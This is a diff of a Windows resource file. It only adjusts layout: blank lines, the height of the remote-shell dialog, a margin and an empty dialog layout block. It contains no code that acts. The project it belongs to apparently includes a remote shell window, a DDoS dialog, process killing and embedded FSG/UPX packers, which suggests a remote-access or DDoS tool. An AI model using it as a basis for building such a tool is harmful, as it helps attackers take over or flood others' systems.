@@ -179,6 +179,7 @@ IDB_BMP_MAIN            BITMAP                  "res\\MainToolbar.bmp"
 
 IDR_MAINTOOLBAR         BITMAP                  "res\\toolbar1.bmp"
 
+
 /////////////////////////////////////////////////////////////////////////////
 //
 // Toolbar
@@ -207,7 +208,6 @@ BEGIN
     BUTTON      ID_BTN_TWEBSITE
     BUTTON      ID_BTN_TEXIT
 END
-
 
 
 /////////////////////////////////////////////////////////////////////////////
@@ -313,7 +313,6 @@ IDR_FSG                 EXE                     "res\\fsg.exe"
 IDR_UPX                 EXE                     "res\\upx.exe"
 
 
-
 /////////////////////////////////////////////////////////////////////////////
 //
 // Dialog
@@ -361,7 +360,7 @@ BEGIN
     PUSHBUTTON      "关闭进程",IDC_KILLPROCESS_BTN,395,252,61,13
 END
 
-IDD_SHELL_DLG DIALOGEX 0, 0, 432, 235
+IDD_SHELL_DLG DIALOGEX 0, 0, 432, 242
 STYLE DS_SETFONT | DS_3DLOOK | DS_CENTER | WS_MINIMIZEBOX | WS_POPUP | WS_CAPTION | WS_SYSMENU | WS_THICKFRAME
 CAPTION "[远程Shell]"
 MENU IDR_SHELL
@@ -662,6 +661,7 @@ BEGIN
 
     IDD_SHELL_DLG, DIALOG
     BEGIN
+        BOTTOMMARGIN, 238
     END
 
     IDD_UPDATE_DLG, DIALOG
@@ -930,6 +930,11 @@ BEGIN
 END
 
 IDD_DDOS_DLG AFX_DIALOG_LAYOUT
+BEGIN
+    0
+END
+
+IDD_SHELL_DLG AFX_DIALOG_LAYOUT
 BEGIN
     0
 END
